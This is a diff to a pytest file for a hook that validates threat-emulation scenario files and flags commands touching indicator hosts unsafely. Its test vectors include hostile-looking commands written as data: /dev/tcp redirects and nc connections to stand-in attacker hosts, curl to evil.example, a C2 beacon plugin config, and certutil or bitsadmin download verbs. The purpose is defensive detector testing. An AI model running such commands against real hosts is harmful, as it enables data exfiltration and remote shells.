@@ -106,7 +106,7 @@ def test_hook_rejects_each_indicator_code(tmp_path, mutate, code):
     d["indicators"] = [dict(id="ind-01", type="domain", value="rn-stage.example", safe_form="dns_lookup",
                             source_url="https://unit42.paloaltonetworks.com/x/",
                             surfaces_in=[d["steps"][0]["id"]])]
-    d["steps"][0]["command"] = "dig +short rn-stage.example"
+    d["steps"][0]["command"] = "dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}"
     mutate(d)
     p = tmp_path / "s.yml"
     p.write_text(yaml.safe_dump(d, sort_keys=False))
@@ -119,7 +119,7 @@ def test_hook_accepts_clean_indicator(tmp_path):
     d["indicators"] = [dict(id="ind-01", type="domain", value="rn-stage.example", safe_form="dns_lookup",
                             source_url="https://unit42.paloaltonetworks.com/x/",
                             surfaces_in=[d["steps"][0]["id"]])]
-    d["steps"][0]["command"] = "dig +short rn-stage.example"
+    d["steps"][0]["command"] = "dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}"
     p = tmp_path / "s.yml"
     p.write_text(yaml.safe_dump(d, sort_keys=False))
     r = subprocess.run([sys.executable, str(HOOK), str(p), str(REPO_ROOT)], capture_output=True, text=True)
@@ -164,7 +164,7 @@ def _violations(indicators, command="echo ok", variants=None, cleanup=None):
 def _hook_out(tmp_path, mutate):
     d = yaml.safe_load(SAMPLE.read_text())
     d["indicators"] = [_ind(surfaces_in=[d["steps"][0]["id"]])]
-    d["steps"][0]["command"] = "dig +short rn-stage.example"
+    d["steps"][0]["command"] = "dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}"
     mutate(d)
     p = tmp_path / "s.yml"
     p.write_text(yaml.safe_dump(d, sort_keys=False))
@@ -193,7 +193,7 @@ def test_fix_subdomain_counts_but_prefixed_label_does_not():
 
 @pytest.mark.parametrize("cmd,fires", [
     ("dig +short rn-stage.example @${LAB_RESOLVER:-1.1.1.1}", False),
-    ("dig +short rn-stage.example", False),
+    ("dig +short rn-stage.example", True),  # no resolver named
     ("dig +short rn-stage.example | xargs curl", True),
     ("dig rn-stage.example; nc rn-stage.example 443", True),
     ("dig rn-stage.example && nc rn-stage.example 443", True),
@@ -245,7 +245,7 @@ _PARITY_VECTORS = [
     ("dig allowed", [_ind()], "dig +short rn-stage.example @${R:-1.1.1.1}", None, None),
     ("dig npm hostname", [_ind(value="npm-cache.example")],
      "dig +short npm-cache.example @${LAB_RESOLVER:-127.0.0.53}", None, None),
-    ("host curl hostname", [_ind(value="curl.example")], "host curl.example", None, None),
+    ("host curl hostname", [_ind(value="curl.example")], "host curl.example ${LAB_RESOLVER}", None, None),
     ("dig piped xargs curl", [_ind()], "dig +short rn-stage.example | xargs curl -s", None, None),
     ("hash npm", [_ind(type="sha256", value="d" * 64, safe_form="hash_only")],
      "npm install evil-pkg " + "d" * 64, None, None),
@@ -286,6 +286,55 @@ _PARITY_VECTORS = [
      "wget https://x/" + "c" * 64, None, None),
     ("hash off fetch", [_ind(type="sha256", value="c" * 64, safe_form="hash_only")],
      "echo " + "c" * 64 + " | sha256sum -c", None, None),
+] + [
+    # ── final review: I1 / I2 / M2 / M3 / M4 ──
+    (f"I1 {i}", [ind], cmd, None, None) for i, (ind, cmd) in enumerate([
+        (_ind(value="evil.example"), "dig evil.example >/dev/tcp/203.0.113.9/443"),
+        (_ind(value="evil.example"), "dig evil.example & nc evil.example 443"),
+        (_ind(value="evil.example"), "dig evil.example <(nc 203.0.113.9 80)"),
+        (_ind(value="evil.example"), "dig evil.example @${LAB_RESOLVER:-127.0.0.53} >(nc x 80)"),
+        (_ind(value="evil.example"), "dig evil.example @${LAB_RESOLVER:-127.0.0.53} > /tmp/o"),
+        (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"), "dig @203.0.113.9 evil.example"),
+        (_ind(value="evil.example"), "dig +short evil.example"),
+        (_ind(value="evil.example"), "dig +short evil.example @evil.example"),
+        (_ind(value="evil.example"), "dig +short evil.example @${LAB_RESOLVER:-127.0.0.53}"),
+        (_ind(value="evil.example"), "nslookup evil.example $env:LAB_RESOLVER"),
+        (_ind(value="evil.example"), "getent hosts evil.example"),
+    ])
+] + [
+    (f"I2 {i}", [_ind(type="ipv4", value="203.0.113.9", safe_form="log_field")], cmd, None, None)
+    for i, cmd in enumerate([
+        "bash <<'EOF'\nparams:\n  curl http://203.0.113.9/x\nEOF",
+        "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: c2_http_beacon\n    params:\n"
+        "      target_url: http://203.0.113.9/\nYML",
+        "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
+        "      dst_ip: 203.0.113.9\nYML",
+        "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
+        "      dst_ip: 203.0.113.9\n  - plugin: ssh_egress\n    params:\n      host: x\nYML",
+        "cat > \"$W/c.yaml\" <<'YML'\nsteps:\n  - plugin: email_emitter\n    params:\n"
+        "      ip: 203.0.113.9\nYML",
+        "cat > /tmp/c.yml <<YML\nparams:\n  dst_ip: 203.0.113.9\nYML",
+    ])
+] + [
+    ("M2 herestring", [_ind(type="ipv4", value="203.0.113.9", safe_form="log_field")],
+     "cat > /tmp/c.yml <<<EOF\nplugin: ngfw_eal_emitter\nparams:\n  curl http://203.0.113.9/x\nEOF",
+     None, None),
+    ("M2 comment", [_ind(type="ipv4", value="203.0.113.9", safe_form="log_field")],
+     "# cat > /tmp/c.yml <<EOF\nplugin: ngfw_eal_emitter\nparams:\n  curl http://203.0.113.9/x\nEOF",
+     None, None),
+    ("M2 arith", [_ind(value="evil.example")],
+     "x=$(( FLAG << SHIFT ))\ndig +short evil.example @${LAB_RESOLVER:-127.0.0.53}\nSHIFT", None, None),
+    ("M3 url host", [_ind(type="url", value="https://evil.example/s2", safe_form="log_field")],
+     "curl http://evil.example/other", None, None),
+    ("M3 url host lookup", [_ind(type="url", value="https://evil.example/s2", safe_form="log_field")],
+     "dig +short evil.example @${LAB_RESOLVER:-127.0.0.53}", None, None),
+    ("M3 url ip host", [_ind(type="url", value="http://203.0.113.9:8080/x", safe_form="log_field")],
+     "nc 203.0.113.9 8080", None, None),
+] + [
+    (f"M4 {v}", [_ind(type="sha256", value="e" * 64, safe_form="hash_only")],
+     f"{v} https://x/" + "e" * 64, None, None)
+    for v in ("certutil -urlcache -f", "bitsadmin /transfer j", "Start-BitsTransfer -Source",
+              "aria2c", "scp", "tftp -g -r", "ftp -n", "ftp.example", "sftp-helper")
 ]
 
 
@@ -329,7 +378,7 @@ def test_hook_malformed_indicator_fields_report_not_crash(tmp_path, mutate, code
 
 @pytest.mark.parametrize("cmd,value", [
     ("dig +short npm-cache.example @${LAB_RESOLVER:-127.0.0.53}", "npm-cache.example"),
-    ("host curl.example", "curl.example"),
+    ("host curl.example ${LAB_RESOLVER}", "curl.example"),
 ])
 def test_hook_fetch_verb_in_hostname_does_not_block_lookup(cmd, value):
     hook = _load_hook()
@@ -416,3 +465,66 @@ def test_campaign_id_error_reaches_cli_exit_code(tmp_path):
     r = subprocess.run([sys.executable, str(HOOK), str(p), str(REPO_ROOT)], capture_output=True, text=True)
     assert "does not match" in r.stdout + r.stderr and "CMP-MP-033-THREAT" in r.stdout + r.stderr
     assert r.returncode != 0
+
+
+# ── final review: hook mirrors the tightened rule + in_band ──────────────────
+_FIRES = [  # (indicator, command) pairs that must fire S-25 in the HOOK
+    (_ind(value="evil.example"), "dig evil.example >/dev/tcp/203.0.113.9/443"),
+    (_ind(value="evil.example"), "dig evil.example & nc evil.example 443"),
+    (_ind(value="evil.example"), "dig evil.example <(nc 203.0.113.9 80)"),
+    (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"), "dig @203.0.113.9 evil.example"),
+    (_ind(value="evil.example"), "dig +short evil.example"),
+    (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"),
+     "bash <<'EOF'\nparams:\n  curl http://203.0.113.9/x\nEOF"),
+    (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"),
+     "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: c2_http_beacon\n    params:\n"
+     "      target_url: http://203.0.113.9/\nYML"),
+    (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"),
+     "cat > /tmp/c.yml <<<EOF\nplugin: ngfw_eal_emitter\nparams:\n  curl http://203.0.113.9/x\nEOF"),
+    (_ind(type="url", value="https://evil.example/s2", safe_form="log_field"),
+     "curl http://evil.example/other"),
+]
+
+
+@pytest.mark.parametrize("ind,cmd", _FIRES)
+def test_final_hook_fires(ind, cmd):
+    assert any(l.startswith("S-25") for l in _violations([ind], cmd))
+
+
+@pytest.mark.parametrize("ind,cmd", [
+    (_ind(value="evil.example"), "dig +short evil.example @${LAB_RESOLVER:-127.0.0.53}"),
+    (_ind(value="evil.example"), "nslookup evil.example $env:LAB_RESOLVER"),
+    (_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"),
+     "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
+     "      dst_ip: 203.0.113.9\nYML"),
+    (_ind(value="evil.example"),
+     "x=$(( FLAG << SHIFT ))\ndig +short evil.example @${LAB_RESOLVER:-127.0.0.53}\nSHIFT"),
+])
+def test_final_hook_allows(ind, cmd):
+    assert _violations([ind], cmd) == []
+
+
+def test_final_hook_regexes_and_plugin_set_byte_identical():
+    from engine import scenario_loader as sl  # noqa: PLC0415
+    hook = _load_hook()
+    assert hook.COLLECTOR_POST_PLUGINS == sl.COLLECTOR_POST_PLUGINS
+    for h_name, l_name in [("FETCH_VERB_RE", "FETCH_VERB_RE"), ("DNS_LOOKUP_RE", "DNS_LOOKUP_RE"),
+                           ("_HEREDOC_RE", "_HEREDOC_RE"), ("_CHAIN_RE", "_SHELL_CHAIN_RE"),
+                           ("_SH_COMMENT_RE", "_SH_COMMENT_RE"), ("_SH_ARITH_RE", "_SH_ARITH_RE"),
+                           ("_RESOLVER_RE", "_RESOLVER_RE"), ("_RESOLVER_AT_RE", "_RESOLVER_AT_RE"),
+                           ("_CAMPAIGN_FILE_WRITE_RE", "_CAMPAIGN_FILE_WRITE_RE"),
+                           ("_PLUGIN_LINE_RE", "_PLUGIN_LINE_RE"), ("_URL_HOST_RE", "_URL_HOST_RE")]:
+        h, l = getattr(hook, h_name), getattr(sl, l_name)
+        assert (h.pattern, h.flags) == (l.pattern, l.flags), h_name
+
+
+@pytest.mark.parametrize("val", ["no", 0, 1, None, "false"])
+def test_final_hook_in_band_must_be_bool(tmp_path, val):
+    r = _hook_out(tmp_path, lambda d: d["indicators"][0].update(in_band=val))
+    assert r.returncode != 0 and "S-22" in r.stdout and "in_band" in r.stdout
+
+
+@pytest.mark.parametrize("val", [True, False])
+def test_final_hook_in_band_bool_accepted(tmp_path, val):
+    r = _hook_out(tmp_path, lambda d: d["indicators"][0].update(in_band=val))
+    assert "in_band" not in r.stdout
